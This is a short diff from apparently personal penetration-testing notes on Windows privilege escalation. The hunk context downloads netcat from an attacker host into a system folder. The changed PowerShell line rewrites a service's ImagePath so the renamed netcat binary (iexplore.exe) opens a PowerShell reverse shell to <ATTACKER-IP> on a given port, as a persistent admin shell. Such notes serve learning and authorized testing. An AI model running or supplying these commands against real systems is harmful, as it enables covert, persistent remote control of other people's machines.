@@ -148,5 +148,5 @@ wget http://<attackerip/netcat> -outfile C:\windows\system32\spool\drivers\color
 - *THEN WE WILL OPEN ANOTHER SHELL AS ADMIN SO THEN EVEN IF THE FIRST SHELL DIES WE WILL STILL GET PROCESS RUNNING AS OVER REVERSHELL*
 
 ```POWERSHELL
-SET-ITEMPROPERTY <SERVICE-PATH> -NAME ImagePath -value 'C:\windows\system32\spool\drivers\color\iexplore.exe <ATTACKER-IP> -e powershell'
+SET-ITEMPROPERTY <SERVICE-PATH> -NAME ImagePath -value 'C:\windows\system32\spool\drivers\color\iexplore.exe <ATTACKER-IP> <PORT> -e powershell'
 ```
